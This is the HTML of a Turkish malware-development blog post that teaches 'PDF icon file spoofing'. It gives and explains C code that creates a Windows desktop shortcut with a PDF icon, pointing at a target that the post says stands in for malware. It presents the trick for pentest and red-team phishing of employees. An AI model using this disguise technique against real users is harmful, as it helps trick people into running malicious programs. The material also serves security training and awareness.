@@ -1,0 +1,1125 @@
+<!doctype html>
+<html
+  lang="en-us"
+  data-theme="dark"
+>
+  <head>
+    <meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/>
+
+
+
+
+
+
+
+  
+
+<title>
+  PDF Icon File Spoofing | 0xbekoo
+</title>
+<meta
+  name="description"
+  content="Reverse Engineer, Malware Developer"
+/>
+
+
+
+
+
+
+
+
+<script>
+  window.siteConfig = JSON.parse("{\"clipboard\":{\"copyright\":{\"content\":\"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"success\":\"复制成功(*^▽^*)\"},\"icon_font\":\"4552607_tq6stt6tcg\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":\"本文最后更新于 {time}，请注意文中内容可能已经发生变化。\"}}");
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+    
+  
+
+  
+    
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+
+
+
+
+
+
+  <link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  />
+
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+
+
+
+
+  
+ <link rel="stylesheet" href="/css/main.min.59637a2554ed2af98a7c982638a757284f0a2077b36a23d4791d5305198c2570.css" />
+
+
+
+
+
+  <link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+
+
+
+
+
+  <link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+  
+
+
+  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />
+
+
+
+
+  </head>
+  <body>
+    
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/header-photo.gif" alt="PDF Icon File Spoofing">
+  
+
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          
+        
+  
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">PDF Icon File Spoofing</h1>
+          </a>
+        
+      
+  
+      
+        
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+        <main id="content">
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    >
+      
+        <div class="sidebar-toc-sidebar">
+          <div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#code">Code</a></li>
+    <li><a href="#programı-çalıştırma">Programı Çalıştırma</a></li>
+    <li><a href="#sonuç">Sonuç</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+        </div>
+        <div class="sidebar-common-sidebar hidden">
+          
+<div class="sidebar-author">
+  <img
+    data-src="/avatar/../avatar/avatar.png"
+    data-sizes="auto"
+    alt="0xbekoo"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">0xbekoo</div>
+  <div class="sidebar-description">Reverse Engineer, Malware Developer</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">
+      9
+    </div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      4
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">33</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/0xbekoo"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+    <div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/berkayykarakocc"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a
+        href="https://twitter.com/0xbekooo"
+        itemprop="url"
+        target="_blank"
+        aria-label="twitter"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class="sidebar-menu-icon"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class="sidebar-menu-icon"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+
+        </div>
+      
+
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+          <section id="main">
+  <article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta">
+      <div class="article-date">
+  <a
+    href="https://0xbekoo.github.io/post/file-icon-spoofing/"
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-07-31 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2024-07-31</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2024-07-31</time
+    >
+  </a>
+</div>
+
+      <div class="article-category">
+  
+    <a
+      class="article-category-link"
+      href="/categories/malware-development"
+      data-aos="zoom-in"
+      >MALWARE-DEVELOPMENT</a
+    >
+  
+</div>
+
+    </div>
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>Merhabalar, bu yazıda File Icon Spoofing tekniğini inceleyeceğiz.</p>
+<p>Kısaca tekniği özetlemek gerekirse oluşturulan malware&rsquo;in programın icon&rsquo;u değiştirilerek kullanıcıyı yanıltma tekniğidir. Bu sayede kullanıcı, ilgili malware&rsquo;i zararsız bir dosya olarak görebilir. Malware için belirlediğiniz icon, bu konuda örnek olarak gösterileceği gibi bir PDF olabilir veya bir başka icon olabilir. Tekniğin, sosyal mühendislik saldırıları için oldukça etkili bir yöntem olabilir ve ayrıca Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.</p>
+<p>Konunun daha iyi anlaşılması için örnek senaryo üzerinden ilerleyelim, bir şirketin iç ağının güvenliğini test etmek amacıyla görevlendirilmiş bir pentester olduğunuzu düşünün. Şirket çalışanlarının kötü amaçlı dosyaları açma konusunda ne kadar dikkatli olduklarını test etmeniz gerekiyor. Bu bağlamda, kötü amaçlı yazılımınızı zararsız bir PDF dosyası olarak maskeleyerek, bir kimlik avı e-postası aracılığıyla veya paylaşılan bir klasöre yerleştirerek gönderebilirsiniz. Eğer bir çalışan bu dosyayı açarsa, dosya aslında zararlı yazılımı çalıştırarak sistemlerine erişim sağlar.</p>
+<h2 id="code">
+<a class="header-anchor" href="#code"></a>
+Code
+</h2><blockquote>
+<p>Bu konu için kullandığım kod parçası, S12 H4CK&rsquo;in PDF Icon File Spoofing konusundan alınmış ve tarafımca güncellenmiştir. Daha fazla detay için Referanslar kısmından makalesine göz atabilirsiniz.</p>
+</blockquote>
+<p>Hazırlanan örnek kod parçasının github link&rsquo;ine erişmek için <a href="https://github.com/0xbekoo/maldev/tree/main/C/File-Icon-Spoofing">buraya</a> tıklayabilirsiniz.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;strsafe.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wchar.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ShlObj.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;objbase.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CreateShortcut</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> TargetPath, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> ShortcutPath, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> IconPath ) {
+</span></span><span style="display:flex;"><span>    HRESULT         HRES; 
+</span></span><span style="display:flex;"><span>    IShellLink<span style="color:#f92672">*</span>     PSL <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    IPersistFile<span style="color:#f92672">*</span>   PPF <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoInitialize</span>(NULL); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    HRES <span style="color:#f92672">=</span> <span style="color:#a6e22e">CoCreateInstance</span>(<span style="color:#f92672">&amp;</span>CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, <span style="color:#f92672">&amp;</span>IID_IShellLink, (<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>PSL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">FAILED</span>(HRES)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to create IShellLink Object! Error Code:  0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HRES);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetPath</span>(PSL, TargetPath);
+</span></span><span style="display:flex;"><span>    PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetIconLocation</span>(PSL, IconPath, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetDescription</span>(PSL, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Very important file&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    HRES <span style="color:#f92672">=</span> PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">QueryInterface</span>(PSL, <span style="color:#f92672">&amp;</span>IID_IPersistFile, (<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>PPF);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">FAILED</span>(HRES)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to interface! Error Code: 0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HRES);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    HRES <span style="color:#f92672">=</span> PPF<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Save</span>(PPF, ShortcutPath, TRUE);
+</span></span><span style="display:flex;"><span>    PPF<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Release</span>(PPF);
+</span></span><span style="display:flex;"><span>    PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Release</span>(PSL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoUninitialize</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Shortcut Created!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wchar_t</span> TargetPath[MAX_PATH]    <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">calc.exe&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wchar_t</span> IconPath[MAX_PATH]      <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">path</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">to</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pdficon.ico&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wchar_t</span> ShortcutPath[MAX_PATH];
+</span></span><span style="display:flex;"><span>    HRESULT HRFolder;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    HRFolder <span style="color:#f92672">=</span> <span style="color:#a6e22e">SHGetFolderPath</span>(NULL, CSIDL_DESKTOPDIRECTORY, NULL, <span style="color:#ae81ff">0</span>, ShortcutPath);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">FAILED</span>(HRFolder)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to get Desktop Path! Error Code: 0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HRFolder);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">StringCchCatW</span>(ShortcutPath, MAX_PATH, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Projects.lnk&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Merged Path: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ShortcutPath);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">CreateShortcut</span>(TargetPath, ShortcutPath, IconPath) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to create Shortcut!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Kodlara detaylıca göz atalım ve main içerisinden başlayalım:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">wchar_t</span> TargetPath[MAX_PATH]    <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">calc.exe&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">wchar_t</span> IconPath[MAX_PATH]      <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">path</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">to</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pdficon.ico&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">wchar_t</span> ShortcutPath[MAX_PATH];
+</span></span></code></pre></div><ul>
+<li><strong>TargetPath:</strong> Bu değişken, oluşturulacak kısayolun hedef dosyasının yolunu belirtir. Bu değişken bizim malware&rsquo;in yolunu belirtir.</li>
+<li><strong>IconPath:</strong> Bu değişken, oluşturulacak kısayolun icon&rsquo;unun yolunu belirtir.</li>
+<li><strong>ShortcutPath:</strong> Bu değişken, oluşturulacak kısayolun yolunu belirtir. <!-- raw HTML omitted --> <!-- raw HTML omitted --></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HRFolder <span style="color:#f92672">=</span> <span style="color:#a6e22e">SHGetFolderPath</span>(NULL, CSIDL_DESKTOPDIRECTORY, NULL, <span style="color:#ae81ff">0</span>, ShortcutPath);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">FAILED</span>(HRFolder)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to get Desktop Path! Error Code: 0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HRFolder);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">StringCchCatW</span>(ShortcutPath, MAX_PATH, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Projects.lnk&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Merged Path: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ShortcutPath);
+</span></span></code></pre></div><p>Bu kısımda ise ilk olarak <strong>SHGetFolderPath</strong> fonksiyonu ile desktop dizinin tam yolunu alıyoruz. Ardından alınan dizin yoluna ise StringCchCatW aracılığıyla oluşturulacak kısayol ismi ile birleştiriyoruz. Bu sayede oluşturulacak kısayol&rsquo;un tam yolunu elde etmiş oluyoruz.</p>
+<p>Bu kısayol ismini <strong>Projects.lnk</strong> olarak ayarladım. Siz dilerseniz bunu değiştirebilirsiniz. <!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">CreateShortcut</span>(TargetPath, ShortcutPath, IconPath) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to create Shortcut!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Bu kısımda ise oluşturduğumuz CreateShortcut fonksiyonunu çağırıyoruz ve if ile bir karşılaştırma yapıyoruz. Eğer CreateShortcut fonksiyonu 0&rsquo;dan yüksek yani 1 değerini döndürürse hata mesajı ekrana bastırarak -1 ile programı return ettiriyoruz. <!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">CoInitialize</span>(NULL); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>HRES <span style="color:#f92672">=</span> <span style="color:#a6e22e">CoCreateInstance</span>(<span style="color:#f92672">&amp;</span>CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, <span style="color:#f92672">&amp;</span>IID_IShellLink, (<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>PSL);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">FAILED</span>(HRES)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to create IShellLink Object! Error Code:  0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HRES);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>CreateShortcut fonksiyon içerisinde ise ilk olarak CoInitialize fonksiyonu ile COM bileşenlerini başlatıyoruz. Peki ama neden COM bileşenlerini başlatıyoruz?</p>
+<p>Çünkü IShellLink ve IPersistFile interface&rsquo;leri COM bileşenleridir. Bu interface&rsquo;ler bizim kısayol oluşturmak için kullanacağımız araçlardır. Dolayasıyla bunlara erişmemiz için COM bileşenlerini başlatmamız gerekmektedir.</p>
+<p>Ardından CoCreateInstance fonksiyonu ile IShellLink interface&rsquo;ini oluşturuyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. <!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetPath</span>(PSL, TargetPath);
+</span></span><span style="display:flex;"><span>PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetIconLocation</span>(PSL, IconPath, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetDescription</span>(PSL, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Very important file&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HRES <span style="color:#f92672">=</span> PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">QueryInterface</span>(PSL, <span style="color:#f92672">&amp;</span>IID_IPersistFile, (<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>PPF);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">FAILED</span>(HRES)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Failed to interface! Error Code: 0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HRES);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Bu kod bloğunda ise oluşturduğumuz IShellLink interface&rsquo;ine <strong>Target Path</strong>, <strong>Icon Path</strong> ve <strong>Description</strong> ekliyoruz. Bu adımlar, oluşturacağımız kısayolun özelliklerini belirtir.</p>
+<p>Ardından QueryInterface fonksiyonu ile IPersistFile interface&rsquo;ine erişim sağlıyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. <!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HRES <span style="color:#f92672">=</span> PPF<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Save</span>(PPF, ShortcutPath, TRUE);
+</span></span><span style="display:flex;"><span>PPF<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Release</span>(PPF);
+</span></span><span style="display:flex;"><span>PSL<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Release</span>(PSL);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CoUninitialize</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Shortcut Created!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></code></pre></div><p>Son olarak ise Save fonksiyonu ile oluşturduğumuz kısayolu, main içerisinde oluşturduğumuz tam yoluna kaydediyoruz. Ardından IPersistFile ve IShellLink interface&rsquo;lerini serbest bırakıyoruz. CoUninitialize fonksiyonu ile COM bileşenlerini sonlandırıyoruz. Son olarak kısayolun oluşturulduğuna dair bir mesaj bastırıyoruz. <!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<h2 id="programı-çalıştırma">
+<a class="header-anchor" href="#program%c4%b1-%c3%a7al%c4%b1%c5%9ft%c4%b1rma"></a>
+Programı Çalıştırma
+</h2><p>Programı çalıştırdığımızda ise masaüstünde kısayolumuz aşağıdaki gibi gözükecektir:</p>
+<p><img src="../../images/posts/file-spoofing/img1.png" alt=""></p>
